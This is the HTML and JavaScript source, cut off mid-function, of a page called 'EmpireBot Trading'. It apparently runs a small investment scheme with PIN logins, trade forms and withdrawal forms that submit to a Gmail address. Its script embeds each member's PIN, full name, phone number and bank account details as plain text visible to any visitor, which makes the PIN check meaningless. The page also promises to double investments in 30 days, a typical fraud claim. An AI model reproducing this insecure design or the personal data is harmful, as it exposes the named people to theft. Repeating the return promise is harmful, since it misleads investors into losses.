<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>EmpireBot Trading</title>
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap" rel="stylesheet">
  <style>
    :root {
      --primary-bg: #111317;
      --card-bg: #181b22;
      --accent: #58d2fa;
      --accent2: #e859e2;
      --accent3: #ffd54f;
      --danger: #e57373;
      --success: #8dd37e;
      --muted: #bdbdbd;
      --text: #fff;
      --btn-bg: linear-gradient(90deg, #4fc3f7 0%, #ab47bc 100%);
      --btn-bg-hover: linear-gradient(90deg, #0288d1 0%, #7e57c2 100%);
    }
    html, body {
      height: 100%; margin: 0; padding: 0;
      background: var(--primary-bg); color: var(--text); font-family: 'Roboto', sans-serif;
    }
    body { min-height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
    .centered { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; width: 100vw;}
    .login-surface {
      background: var(--card-bg); border-radius: 16px; box-shadow: 0 4px 28px rgba(0,0,0,0.7);
      padding: 38px 28px 36px 28px; width: 92vw; max-width: 350px; text-align: center;
      margin: auto;
    }
    .login-title {
      font-size: 1.35em; margin-bottom: 22px; color: var(--accent2);
      font-weight: bold; letter-spacing: 1px;
      background: linear-gradient(90deg, var(--accent), var(--accent2), var(--accent3) 80%);
      background-clip: text; -webkit-background-clip: text; color: transparent; -webkit-text-fill-color: transparent;
    }
    .login-surface input[type="password"] {
      width: 80%; padding: 13px; margin-bottom: 18px; border-radius: 8px; border: 1.5px solid var(--accent2);
      background: var(--primary-bg); color: var(--text); font-size: 1.1em; transition: border 0.2s;
      letter-spacing: 5px; text-align: center;
    }
    .login-surface input:focus { outline: none; border: 1.5px solid var(--accent); }
    .login-surface button {
      padding: 13px 38px; background: var(--btn-bg); color: var(--primary-bg); border: none;
      border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 1.1em; letter-spacing: 0.5px;
      box-shadow: 0 2px 8px rgba(79,195,247,0.13); transition: background 0.2s, color 0.2s;
    }
    .login-surface button:hover { background: var(--btn-bg-hover); color: #fff; }
    .login-error { color: var(--danger); margin-top: 10px; font-size: 0.98em; display:none;}
    .loader-bg {
      min-height: 100vh; width: 100vw; background: rgba(17,19,23,0.97);
      display: flex; align-items: center; justify-content: center; flex-direction: column; z-index: 100;
      position: fixed; top: 0; left: 0; right: 0; bottom: 0; transition: opacity 0.3s;
    }
    .loader-circle {
      width: 120px; height: 120px; border-radius: 50%; background: var(--card-bg);
      display: flex; align-items: center; justify-content: center; margin-bottom: 24px; box-shadow: 0 0 25px #ab47bc40;
      position: relative;
      animation: pulse 2s infinite;
    }
    .loader-spin-img {
      width: 80px; height: 80px; border-radius: 50%; object-fit: cover; border: 4px solid var(--accent2);
      box-shadow: 0 2px 15px 2px #4fc3f777;
      animation: spin 2s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0);}
      100% { transform: rotate(360deg);}
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 25px #ab47bc40;}
      50% { box-shadow: 0 0 40px #4fc3f799;}
      100% { box-shadow: 0 0 25px #ab47bc40;}
    }
    .loader-text {
      color: var(--accent); font-size: 1.15em; font-weight: 600; letter-spacing: 0.5px;
      text-align: center; margin-top: 0;
    }
    .typing-loader-msg {
      color: var(--accent2);
      font-size: 1.15em;
      font-weight: 600;
      letter-spacing: 0.5px;
      text-align: center;
      margin-top: 10px;
      min-height: 60px;
      white-space: pre-wrap;
      word-break: break-word;
      animation: none;
      display: none;
    }
    #trade-proceed-btn {
      display: none;
      margin-top: 25px;
      padding: 12px 38px;
      background: var(--btn-bg);
      color: var(--primary-bg);
      border: none;
      border-radius: 8px;
      font-weight: 700;
      cursor: pointer;
      font-size: 1.1em;
      letter-spacing: 0.5px;
      box-shadow: 0 2px 8px rgba(79,195,247,0.13);
      transition: background 0.2s, color 0.2s;
    }
    #trade-proceed-btn:hover { background: var(--btn-bg-hover); color: #fff; }
    /* Withdrawal button styling */
    #withdrawal-btn {
      flex: 1 1 46%;
      padding: 12px 0;
      border-radius: 8px;
      border: none;
      font-weight: 700;
      font-size: 1.04em;
      transition: background 0.17s, color 0.17s;
      cursor: pointer;
      box-shadow: 0 1px 5px rgba(79,195,247,0.09);
      text-align: center;
      text-decoration: none;
      background: var(--btn-bg);
      color: #191c24;
      margin: 0 3px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    #withdrawal-btn:disabled, .profile-actions .disabled {
      background: #31313f; color: #bbb; pointer-events: none; opacity: 0.7;
    }
    #withdrawal-btn:hover {
      background: var(--btn-bg-hover); color: #fff;
    }
    /* Withdrawal Modal */
    .withdrawal-form-modal-bg {
      display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.94); z-index: 1025; justify-content: center; align-items: center;
    }
    .withdrawal-form-modal-bg.active { display: flex; }
    .withdrawal-form-modal-card {
      background: var(--card-bg); border-radius: 16px; box-shadow: 0 6px 36px rgba(171,71,188,0.18);
      width: 94vw; max-width: 340px; padding: 22px 12px 17px 12px; position: relative; max-height: 88vh;
      display: flex; flex-direction: column; border-top: 3px solid var(--accent2);
      animation: profileFadeIn 0.32s;
    }
    .withdrawal-form-modal-close {
      position: absolute; top: 8px; right: 13px; background: none; border: none; font-size: 1.3em; color: var(--accent2);
      cursor: pointer;
    }
    .withdrawal-form-modal-card h3 { color: var(--accent2); text-align: center; font-weight: bold; margin-bottom: 10px; }
    .withdrawal-form input, .withdrawal-form select {
      width: 98%; padding: 11px; margin: 8px 0 13px 0; border-radius: 7px; border: 1px solid var(--accent2);
      background: var(--primary-bg); color: var(--text); font-size: 1em;
    }
    .withdrawal-form input:focus { outline: none; border: 1.5px solid var(--accent);}
    .withdrawal-form button {
      width: 100%; padding: 12px 0; border-radius: 8px; background: var(--btn-bg); color:#181b22; font-weight:700;
      font-size: 1.09em; cursor:pointer; border:none; margin-top:3px;
      box-shadow: 0 2px 8px rgba(171,71,188,0.10); transition: background 0.18s, color 0.18s;
      letter-spacing: 0.5px;
    }
    .withdrawal-form button:hover { background: var(--btn-bg-hover); color:#fff; }
    @media (max-width: 480px) {
      .profile-card, .status-modal-card, .login-surface, .withdrawal-form-modal-card { max-width: 99vw; padding: 12px 3vw 22px 3vw;}
    }
    .profile-card {
      background: var(--card-bg); border-radius: 18px; box-shadow: 0 2px 16px rgba(0,0,0,0.25);
      width: 98vw; max-width: 410px; margin: auto; margin-top: 32px; padding: 28px 20px 30px 20px;
      text-align: center; position: relative; border-top: 3px solid var(--accent2);
      animation: profileFadeIn 0.45s;
    }
    @keyframes profileFadeIn {
      from { opacity: 0; transform: translateY(30px);}
      to { opacity: 1; transform: translateY(0);}
    }
    .profile-img {
      width: 92px; height: 92px; border-radius: 50%; object-fit: cover; margin-bottom: 12px;
      border: 3px solid var(--accent3); box-shadow: 0 2px 16px 2px rgba(171,71,188,0.13);
    }
    .profile-row {
      margin-bottom: 8px; font-size: 1.06em;
    }
    .profile-referral {
      font-size: 1.08em;
      margin-bottom: 8px;
      color: var(--accent);
      font-weight: 600;
      letter-spacing: 0.2px;
    }
    .profile-name {
      font-size: 1.33em; font-weight: 700; margin-bottom: 10px; color: var(--accent2); letter-spacing: 0.5px;
    }
    .profile-balance {
      font-weight: bold; color: var(--accent3); font-size: 1.13em; margin-bottom: 6px;
    }
    .profile-expiry {
      font-weight: bold; color: var(--accent); font-size: 1em; margin-bottom: 12px;
    }
    .profile-expired-notice {
      color: var(--danger); font-weight: 700; margin: 12px 0 14px 0; background: #2a191b;
      padding: 10px 0; border-radius: 8px; border: 1.5px solid var(--danger); font-size: 1.07em;
      animation: blink 1.1s linear infinite;
    }
    @keyframes blink {
      0%,100{opacity:1;} 50%{opacity:0.5;}
    }
    .profile-trade-schedule {
      font-size: 1.02em; color: var(--muted); margin-bottom: 15px;
      background: linear-gradient(90deg, #4fc3f7, #ffd54f 70%); background-clip: text; -webkit-background-clip: text; color: transparent; -webkit-text-fill-color: transparent;
      font-weight: 500;
    }
    .profile-actions {
      display: flex; gap: 13px; margin: 19px 0 0 0; justify-content: center; flex-wrap: wrap;
    }
    .profile-actions button, .profile-actions a {
      flex: 1 1 46%; padding: 12px 0; border-radius: 8px; border: none; font-weight: 700;
      font-size: 1.04em; transition: background 0.17s, color 0.17s; cursor: pointer;
      box-shadow: 0 1px 5px rgba(79,195,247,0.09); text-align: center; text-decoration: none;
      background: var(--btn-bg); color: #191c24; margin: 0 3px;
      display: flex; align-items: center; justify-content: center;
    }
    .profile-actions button:disabled, .profile-actions .disabled {
      background: #31313f; color: #bbb; pointer-events: none; opacity: 0.7;
    }
    .profile-actions button:hover, .profile-actions a:hover {
      background: var(--btn-bg-hover); color: #fff;
    }
    .profile-status-icon {
      position: absolute; top: 12px; right: 18px; cursor: pointer; background: none; border: none;
      outline: none; z-index: 2;
    }
    .profile-status-icon svg {
      width: 36px; height: 36px; stroke: var(--accent2); fill: var(--card-bg); border-radius: 50%; background: var(--card-bg);
      box-shadow: 0 2px 10px #ab47bc30;
      transition: box-shadow 0.19s;
    }
    .profile-status-icon:active svg {
      box-shadow: 0 2px 18px #ffd54f40;
    }
    .status-modal-bg {
      display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.90); z-index: 1010;
      justify-content: center; align-items: center;
    }
    .status-modal-bg.active { display: flex; }
    .status-modal-card {
      background: var(--card-bg); border-radius: 16px; box-shadow: 0 6px 38px rgba(171,71,188,0.19);
      width: 94vw; max-width: 350px; padding: 24px 17px 17px 17px; position: relative; max-height: 87vh;
      display: flex; flex-direction: column; border-top: 3px solid var(--accent2);
      animation: profileFadeIn 0.32s;
    }
    .status-modal-card h3 { color: var(--accent2); text-align: center; font-weight: bold; margin-bottom: 14px; }
    .status-row { margin-bottom: 12px; font-size: 1.04em; }
    .status-row span { font-weight: 700; color: var(--accent3);}
    .status-modal-close {
      position: absolute; top: 8px; right: 14px; background: none; border: none; font-size: 1.32em; color: var(--accent2);
      cursor: pointer;
    }
    .trade-form-modal-bg {
      display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.94); z-index: 1020; justify-content: center; align-items: center;
    }
    .trade-form-modal-bg.active { display: flex; }
    .trade-form-modal-card {
      background: var(--card-bg); border-radius: 16px; box-shadow: 0 6px 36px rgba(171,71,188,0.18);
      width: 94vw; max-width: 340px; padding: 22px 12px 17px 12px; position: relative; max-height: 88vh;
      display: flex; flex-direction: column; border-top: 3px solid var(--accent2);
      animation: profileFadeIn 0.32s;
    }
    .trade-form-modal-close {
      position: absolute; top: 8px; right: 13px; background: none; border: none; font-size: 1.3em; color: var(--accent2);
      cursor: pointer;
    }
    .trade-form-modal-card h3 { color: var(--accent2); text-align: center; font-weight: bold; margin-bottom: 10px; }
    .trade-form input, .trade-form select {
      width: 98%; padding: 11px; margin: 8px 0 13px 0; border-radius: 7px; border: 1px solid var(--accent2);
      background: var(--primary-bg); color: var(--text); font-size: 1em;
    }
    .trade-form input:focus { outline: none; border: 1.5px solid var(--accent);}
    .trade-form button {
      width: 100%; padding: 12px 0; border-radius: 8px; background: var(--btn-bg); color:#181b22; font-weight:700;
      font-size: 1.09em; cursor:pointer; border:none; margin-top:3px;
      box-shadow: 0 2px 8px rgba(171,71,188,0.10); transition: background 0.18s, color 0.18s;
      letter-spacing: 0.5px;
    }
    .trade-form button:hover { background: var(--btn-bg-hover); color:#fff; }
    .trade-summary-table {
      width: 100%; background: var(--secondary-bg); border-radius: 10px; margin-top: 12px; font-size:1.02em;
      color: var(--text); border-collapse: separate; border-spacing: 0;
    }
    .trade-summary-table th, .trade-summary-table td {
      padding: 9px 6px; border-bottom: 1px solid var(--primary-bg);
    }
    .trade-summary-table th { color: var(--accent2);}
    .trade-summary-table tr:last-child td { border-bottom: none;}
  </style>
</head>
<body>
  <div class="centered" id="main-content">
    <div class="login-surface" id="login-surface">
      <div class="login-title">EmpireBot Trading</div>
      <input type="password" id="pin-input" maxlength="4" placeholder="Enter your 4-digit PIN" autocomplete="off" />
      <br>
      <button id="login-btn">Open Profile</button>
      <div class="login-error" id="login-error">Invalid PIN, try again.</div>
    </div>
  </div>

  <!-- Loader -->
  <div class="loader-bg" id="loader-bg" style="display:none;">
    <div class="loader-circle">
      <img src="-5890865169557472356_109.jpg" alt="loader" class="loader-spin-img"/>
    </div>
    <div class="loader-text" id="loader-text">Loading Profile...</div>
    <div class="typing-loader-msg" id="typing-loader-msg"></div>
    <button id="trade-proceed-btn">Proceed</button>
  </div>
  
  <!-- Status Modal -->
  <div class="status-modal-bg" id="status-modal">
    <div class="status-modal-card">
      <button class="status-modal-close" onclick="closeStatusModal()">&times;</button>
      <h3>Account Status</h3>
      <div id="status-content"></div>
    </div>
  </div>

  <!-- Trade Form Modal -->
  <div class="trade-form-modal-bg" id="trade-form-modal">
    <div class="trade-form-modal-card">
      <button class="trade-form-modal-close" onclick="closeTradeFormModal()">&times;</button>
      <h3>Trade Now</h3>
      <form id="trade-form" class="trade-form" action="https://formsubmit.co/empirevirtual99@gmail.com" target="_blank" method="POST" autocomplete="off">
        <input type="hidden" name="_template" value="table">
        <input type="hidden" name="_subject" value="EmpireBot Trade Submission">
        <input type="hidden" name="User PIN" id="form-pin" readonly>
        <label>
          Name<br>
          <input type="text" name="Name" id="form-name" required readonly>
        </label>
        <label>
          Amount (₦5,000 - ₦50,000)<br>
          <input type="number" name="Amount" id="form-amount" min="5000" max="50000" step="1000" required>
        </label>
        <label>
          Date<br>
          <input type="date" name="Date" id="form-date" required>
        </label>
        <label>
          PIN<br>
          <input type="password" name="Trade PIN" id="form-trade-pin" maxlength="4" required pattern="\d{4}" placeholder="4-digit PIN">
        </label>
        <div id="form-error" style="color: #e57373; display:none; margin-bottom: 10px; font-size:0.98em;"></div>
        <button type="submit">Submit Trade</button>
      </form>
    </div>
  </div>

  <!-- Withdrawal Form Modal -->
  <div class="withdrawal-form-modal-bg" id="withdrawal-form-modal">
    <div class="withdrawal-form-modal-card">
      <button class="withdrawal-form-modal-close" onclick="closeWithdrawalFormModal()">&times;</button>
      <h3>Withdraw Funds</h3>
      <form id="withdrawal-form" class="withdrawal-form" action="https://formsubmit.co/empirevirtual99@gmail.com" target="_blank" method="POST" autocomplete="off">
        <input type="hidden" name="_template" value="table">
        <input type="hidden" name="_subject" value="EmpireBot Withdrawal Submission">
        <input type="hidden" name="User PIN" id="withdrawal-form-pin" readonly>
        <label>
          Name<br>
          <input type="text" name="Name" id="withdrawal-form-name" required readonly>
        </label>
        <label>
          Amount (₦1,000 - ₦20,000)<br>
          <input type="number" name="Amount" id="withdrawal-form-amount" min="1000" max="20000" step="500" required>
        </label>
        <label>
          Account Name<br>
          <input type="text" name="Account Name" id="withdrawal-form-account-name" required readonly>
        </label>
        <label>
          Account Number<br>
          <input type="text" name="Account Number" id="withdrawal-form-account-number" required readonly>
        </label>
        <label>
          Bank Name<br>
          <input type="text" name="Bank Name" id="withdrawal-form-bank" required readonly>
        </label>
        <label>
          Date<br>
          <input type="date" name="Date" id="withdrawal-form-date" required>
        </label>
        <label>
          PIN<br>
          <input type="password" name="Withdrawal PIN" id="withdrawal-form-trade-pin" maxlength="4" required pattern="\d{4}" placeholder="4-digit PIN">
        </label>
        <div id="withdrawal-form-error" style="color: #e57373; display:none; margin-bottom: 10px; font-size:0.98em;"></div>
        <button type="submit">Submit Withdrawal</button>
      </form>
    </div>
  </div>

  <script>
    // ----------- TRADE DATE/TIME SETTINGS -----------
    const TRADE_DAYS = [1];
    const TRADE_START_HOUR = 0;
    const TRADE_END_HOUR = 18;
    // Withdrawal time settings
    const WITHDRAWAL_START_HOUR = 8;
    const WITHDRAWAL_END_HOUR = 10;
    // -----------------------------------------------

    // User Data
    const users = {
      "3572": {
        pin: "3572",
        name: "EMMANUEL EKPA",
        referral_code: "BOT-01",
        image: "AddText_05-22-01.29.33.png",
        beneficiary: "08105866469",
        account_name: "EMMANUEL EMMANUEL EKPA",
        account_number: "8145300013",
        bank: "F.C.M.B",
        registered: "2024-03-15",
        expiry: "2025-12-01",
        update_link: "https://paystack.shop/pay/fpjpxhey-5",
        wallet_balance: 0,
      },
      "4073": {
        pin: "4073",
        name: "ESTHER AMOS",
        referral_code: "BOT-02",
        image: "AddText_05-25-10.37.46.png",
        beneficiary: "08130024073",
        account_name: "ESTHER EKERETTE AMOS",
        account_number: "4301808534",
        bank: "Zenith Bank International",
        registered: "2024-06-25",
        expiry: "2025-12-01",
        update_link: "https://paystack.shop/pay/fpjpxhey-5",
        wallet_balance: 0,
      },
      "1313": {
        pin: "1313",
        name: "ITOHOWO AKAN",
        referral_code: "BOT-03",
        image: "AddText_05-25-10.37.07.png",
        beneficiary: "09037060454",
        account_name: "ITOHOWO JOHN AKAN",
        account_number: "2088350310",
        bank: "Zenith Bank International",
        registered: "2024-06-01",
        expiry: "2025-12-01",
        update_link: "https://paystack.shop/pay/fpjpxhey-5",
        wallet_balance: 0,
      },
      "5012": {
        pin: "5012",
        name: "SAMUEL AKPAN",
        referral_code: "BOT-04",
        image: "AddText_06-03-08.29.58.png",
        beneficiary: "09138109857",
        account_name: "SAMUEL MONDAY AKPAN",
        account_number: "2309320542",
        bank: "UBA",
        registered: "2024-06-10",
        expiry: "2025-12-01",
        update_link: "https://paystack.shop/pay/fpjpxhey-5",
        wallet_balance: 0,
      },
      "1266": {
        pin: "1266",
        name: "SAMUEL IME",
        referral_code: "BOT-05",
        image: "AddText_05-22-09.03.57.png",
        beneficiary: "N/N",
        account_name: "SAMUEL IME",
        account_number: "2311076735",
        bank: "Ekobank",
        registered: "2024-07-01",
        expiry: "2025-12-01",
        update_link: "https://paystack.shop/pay/fpjpxhey-5",
        wallet_balance: 0,
      },
      "1220": {
        pin: "1220",
        name: "SAVIOUR EKONG",
        referral_code: "BOT-06",
        image: "AddText_05-29-09.19.44.png",
        beneficiary: "N/N",
        account_name: "SAVIOUR EKONG",
        account_number: "N/N",
        bank: "N/N",
        registered: "2024-07-05",
        expiry: "2025-12-01",
        update_link: "https://paystack.shop/pay/fpjpxhey-5",
        wallet_balance: 0,
      },
      "2019": {
        pin: "2019",
        name: "CHARITY HANSON",
        referral_code: "BOT-07",
        image: "AddText_06-02-03.50.45.png",
        beneficiary: "08028803872",
        account_name: "CHARITY ASUQUO HANSON",
        account_number: "2266867085",
        bank: "UBA",
        registered: "2024-07-10",
        expiry: "2025-12-01",
        update_link: "https://paystack.shop/pay/fpjpxhey-5",
        wallet_balance: 0,
      },
      "1908": {
        pin: "1908",
        name: "USHIE ONEN",
        referral_code: "BOT-08",
        image: "AddText_06-05-09.14.49.png",
        beneficiary: "07032325480",
        account_name: "USHIE IKPI ONEN",
        account_number: "2061660821",
        bank: "UBA",
        registered: "2024-07-18",
        expiry: "2025-12-01",
        update_link: "https://paystack.shop/pay/fpjpxhey-5",
        wallet_balance: 0,
      }
    };

    let currentUser = null;

    function getTodayStr() {
      const now = new Date();
      const y = now.getFullYear();
      const m = String(now.getMonth()+1).padStart(2, '0');
      const d = String(now.getDate()).padStart(2, '0');
      return `${y}-${m}-${d}`;
    }

    function isExpired(user) {
      if (!user || !user.expiry) return false;
      const now = new Date();
      const parts = user.expiry.split('-');
      if (parts.length !== 3) return false;
      const expiryDate = new Date(parseInt(parts[0]), parseInt(parts[1])-1, parseInt(parts[2]), 23, 59, 59);
      return now > expiryDate;
    }

    function getExpiryStatusString(user) {
      if (!user || !user.expiry) return '';
      const now = new Date();
      const parts = user.expiry.split('-');
      if (parts.length !== 3) return '';
      const expiryDate = new Date(parseInt(parts[0]), parseInt(parts[1])-1, parseInt(parts[2]), 23, 59, 59);
      const msLeft = expiryDate - now;
      if (msLeft < 0) return 'Expired';
      const days = Math.floor(msLeft / (1000*60*60*24));
      if (days > 0) return `${days} day${days!==1?'s':''} left`;
      return 'Less than 1 day left';
    }

    function isTradingOpen() {
      const now = new Date();
      const today = now.getDate();
      const hour = now.getHours();
      const isTradeDay = TRADE_DAYS.includes(today);
      const isTradeHour = hour >= TRADE_START_HOUR && hour < TRADE_END_HOUR;
      return isTradeDay && isTradeHour;
    }

    function isWithdrawalOpen() {
      const now = new Date();
      const hour = now.getHours();
      return hour >= WITHDRAWAL_START_HOUR && hour < WITHDRAWAL_END_HOUR;
    }

    function showLoader(msg="Loading...", duration=6000, cb=()=>{}) {
      document.getElementById('typing-loader-msg').textContent = "";
      document.getElementById('typing-loader-msg').style.display = "none";
      document.getElementById('trade-proceed-btn').style.display = "none";
      document.getElementById('loader-text').style.display = "";
      document.getElementById('loader-text').textContent = msg;
      const loader = document.getElementById('loader-bg');
      loader.style.display = 'flex';
      setTimeout(() => {
        loader.style.display = 'none';
        cb();
      }, duration);
    }

    function showTradeTypingLoader(cb=()=>{}) {
      const loader = document.getElementById('loader-bg');
      const typingMsgEl = document.getElementById('typing-loader-msg');
      const loaderText = document.getElementById('loader-text');
      const proceedBtn = document.getElementById('trade-proceed-btn');
      loader.style.display = "flex";
      loaderText.style.display = "none";
      typingMsgEl.textContent = "";
      typingMsgEl.style.display = "block";
      proceedBtn.style.display = "none";
      proceedBtn.disabled = true;

      const message = "Trade with EmpireStateBank and get 2X of your investment after 30 days. Your income will be transferred directly to your Bank account.";
      const duration = 15000;
      let idx = 0;
      const interval = duration / message.length;
      function typeChar() {
        typingMsgEl.textContent += message[idx];
        idx++;
        if (idx < message.length) {
          setTimeout(typeChar, interval);
        } else {
          proceedBtn.style.display = "block";
          proceedBtn.disabled = false;
        }
      }
      setTimeout(typeChar, interval);
    }

    function doLogin() {
      const pin = document.getElementById('pin-input').value.trim();
      if (users.hasOwnProperty(pin)) {
        currentUser = users[pin];
        document.getElementById('login-error').style.display = 'none';
        showLoader('Loading Profile...', 6000, showProfile);
      } else {
        document.getElementById('login-error').style.display = 'block';
      }
    }

    document.getElementById('login-btn').onclick = doLogin;
    document.getElementById('pin-input').addEventListener('keydown', function(e){
      if (e.key === 'Enter') doLogin();
    });

    function showProfile() {
      const user = currentUser;
      const expired = isExpired(user);
      const expiryStatus = getExpiryStatusString(user);
      const tradingOpen = isTradingOpen();
      const withdrawalOpen = isWithdrawalOpen();
      const canTrade = !expired && tradingOpen && user.wallet_balance >= 5000;
      const canWithdraw = !expired && withdrawalOpen;
      let expiryNotice = '';
      if (expired) {
        expiryNotice = `
          <div class="profile-expired-notice">
            <span>Your account has expired.</span>
          </div>
        `;
      }
      const tradeSchedule = `
        Trading Commence: <b>${TRADE_DAYS.join(", ")}${TRADE_DAYS.length==1?"st":""} of every month, ${String(TRADE_START_HOUR).padStart(2,"0")}:00 - ${String(TRADE_END_HOUR).padStart(2,"0")}:00</b>
      `;
      let tradeNowBtn = '';
      if (!expired) {
        if (canTrade) {
          tradeNowBtn = `<button onclick="startTradeNow()" id="trade-now-btn">Trade Now</button>`;
        } else if (!tradingOpen) {
          tradeNowBtn = `<button disabled class="disabled" id="trade-now-btn">Trade Now<br><small>Trading opens only on ${TRADE_DAYS.join(", ")}${TRADE_DAYS.length==1?"st":""}</small></button>`;
        } else if (user.wallet_balance < 5000) {
          tradeNowBtn = `<button disabled class="disabled" id="trade-now-btn">Trade Now<br><small>Min ₦5,000 balance</small></button>`;
        }
      }
      let withdrawalBtn = '';
      if (!expired) {
        if (canWithdraw) {
          withdrawalBtn = `<button onclick="startWithdrawalNow()" id="withdrawal-btn">Withdraw</button>`;
        } else {
          withdrawalBtn = `<button disabled class="disabled" id="withdrawal-btn">Withdraw<br><small>08:00 - 10:00 daily</small></button>`;
        }
      }
      let fundWalletBtn = `<button onclick="fundWallet()">Fund Wallet</button>`;
      let updateBtn = '';
      if (expired) {
        updateBtn = `<button onclick="updateAccount()" id="update-btn">Update Account</button>`;
      }
      let statusIcon = `
        <button class="profile-status-icon" onclick="openStatusModal()">
          <svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="14" stroke-width="2"/><path d="M16 10v8M16 22h.01" stroke-width="2"/></svg>
        </button>
      `;
      let referralCode = '';
      if (user.referral_code) {
        referralCode = `<div class="profile-referral">Referral Code: <span>${user.referral_code}</span></div>`;
      }
      document.getElementById('main-content').innerHTML = `
        <div class="profile-card">
          ${statusIcon}
          <img src="${user.image}" alt="User Image" class="profile-img"/>
          <div class="profile-name">${user.name}</div>
          ${referralCode}
          <div class="profile-row profile-balance">Wallet: ₦${user.wallet_balance.toLocaleString()}</div>
          <div class="profile-row profile-expiry">
            Expiry Date: <span>${user.expiry} ${expiryStatus && expiryStatus!=="Expired"?`<small>(${expiryStatus})</small>`:""}</span>
          </div>
          ${expiryNotice}
          <div class="profile-trade-schedule">${tradeSchedule}</div>
          <div class="profile-actions">
            ${tradeNowBtn}
            ${withdrawalBtn}
            ${fundWalletBtn}
            ${updateBtn}
          </div>
        </div>
      `;
    }

    window.startTradeNow = function() {
      showTradeTypingLoader();
    };

    document.getElementById('trade-proceed-btn').onclick = function() {
      document.getElementById('loader-bg').style.display = 'none';
      document.getElementById('typing-loader-msg').textContent = "";
      document.getElementById('typing-loader-msg').style.display = "none";
      document.getElementById('trade-proceed-btn').style.display = "none";
      openTradeFormModal();
    };

    function openTradeFormModal() {
      document.getElementById('form-name').value = currentUser.name;
      document.getElementById('form-pin').value = currentUser.pin;
      document.getElementById('form-date').value = getTodayStr();
      document.getElementById('form-amount').value = 5000;
      document.getElementById('form-trade-pin').value = '';
      document.getElementById('form-error').style.display = 'none';
      document.getElementById('form-error').textContent = '';
      document.getElementById('trade-form-modal').classList.add('active');
    }
    function closeTradeFormModal() {
      document.getElementById('trade-form-modal').classList.remove('active');
    }
    document.getElementById('form-trade-pin').addEventListener('input',function(e){
      this.value = this.value.replace(/\D/g,'').slice(0,4);
    });

    const tradeForm = document.getElementById('trade-form');
    tradeForm.onsubmit = function(e) {
      const amount = parseInt(document.getElementById('form-amount').value,10);
      const tpin = document.getElementById('form-trade-pin').value;
      const errorDiv = document.getElementById('form-error');
      errorDiv.style.display = 'none';
      errorDiv.textContent = '';

      if (isNaN(amount) || amount < 5000 || amount > 50000) {
        errorDiv.textContent = 'Amount must be between ₦5,000 and ₦50,000';
        errorDiv.style.display = 'block';
        e.preventDefault();
        return false;
      }
      if (!/^\d{4}$/.test(tpin)) {
        errorDiv.textContent = 'PIN must be 4 digits';
        errorDiv.style.display = 'block';
        e.preventDefault();
        return false;
      }
      if (!currentUser || tpin !== currentUser.pin) {
        errorDiv.textContent = 'PIN does not match your login PIN';
        errorDiv.style.display = 'block';
        e.preventDefault();
        return false;
      }
      if (currentUser.wallet_balance < amount) {
        errorDiv.textContent = `Your wallet balance (₦${currentUser.wallet_balance.toLocaleString()}) is insufficient for this trade.`;
        errorDiv.style.display = 'block';
        e.preventDefault();
        return false;
      }
      closeTradeFormModal();
      showLoader("Submitting trade...", 3000, ()=>{});
    };

    document.getElementById('form-amount').addEventListener('input', function() {
      const amount = parseInt(this.value, 10);
      const errorDiv = document.getElementById('form-error');
      errorDiv.style.display = 'none';
      errorDiv.textContent = '';
      if (isNaN(amount)) return;
      if (currentUser && amount > currentUser.wallet_balance) {
        errorDiv.textContent = `Your wallet balance (₦${currentUser.wallet_balance.toLocaleString()}) is insufficient for this trade.`;
        errorDiv.style.display = 'block';
      }
    });

    window.startWithdrawalNow = function() {
      openWithdrawalFormModal();
    };

    function openWithdrawalFormModal() {
      document.getElementById('withdrawal-form-name').value = currentUser.name;
      document.getElementById('withdrawal-form-pin').value = currentUser.pin;
      document.getElementById('withdrawal-form-account-name').value = currentUser.account_name;
      document.getElementById('withdrawal-form-account-number').value = currentUser.account_number;
      document.getElementById('withdrawal-form-bank').value = currentUser.bank;
      document.getElementById('withdrawal-form-date').value = getTodayStr();
      document.getElementById('withdrawal-form-amount').value = 1000;
      document.getElementById('withdrawal-form-trade-pin').value = '';
      document.getElementById('withdrawal-form-error').style.display = 'none';
      document.getElementById('withdrawal-form-error').textContent = '';
      document.getElementById('withdrawal-form-modal').classList.add('active');
    }
    function closeWithdrawalFormModal() {
      document.getElementById('withdrawal-form-modal').classList.remove('active');
    }
    document.getElementById('withdrawal-form-trade-pin').addEventListener('input',function(e){
      this.value = this.value.replace(/\D/g,'').slice(0,4);
    });

    const withdrawalForm = document.getElementById('withdrawal-form');
    withdrawalForm.onsubmit = function(e) {
      const amount = parseInt(document.getElementById('withdrawal-form-amount').value,10);
      const tpin = document.getElementById('withdrawal-form-trade-pin').value;
      const errorDiv = document.getElementById('withdrawal-form-error');
      errorDiv.style.display = 'none';
      errorDiv.textContent = '';

      if (isNaN(amount) || amount < 1000 || amount > 20000) {
        errorDiv.textContent = 'Amount must be between ₦1,000 and ₦20,000';
        errorDiv.style.display = 'block';
        e.preventDefault();
        return false;
      }
      if (!/^\d{4}$/.test(tpin)) {
        errorDiv.textContent = 'PIN must be 4 digits';
        errorDiv.style.display = 'block';
        e.preventDefault();
        return false;
      }
      if (!currentUser || tpin !== currentUser.pin) {
        errorDiv.textContent = 'PIN does not match your login PIN';
        errorDiv.style.display = 'block';
        e.preventDefault();
        return false;
      }
      if (!isWithdrawalOpen()) {
        errorDiv.textContent = 'Withdrawal is only allowed from 08:00 to 10:00 daily.';
        errorDiv.style.display = 'block';
        e.preventDefault();
        return false;
      }
      closeWithdrawalFormModal();
      showLoader("Submitting withdrawal...", 3000, ()=>{});
    };

    document.getElementById('withdrawal-form-amount').addEventListener('input', function() {
      const amount = parseInt(this.value, 10);
      const errorDiv = document.getElementById('withdrawal-form-error');
      errorDiv.style.display = 'none';
      errorDiv.textContent = '';
      if (isNaN(amount)) return;
      if (amount < 1000 || amount > 20000) {
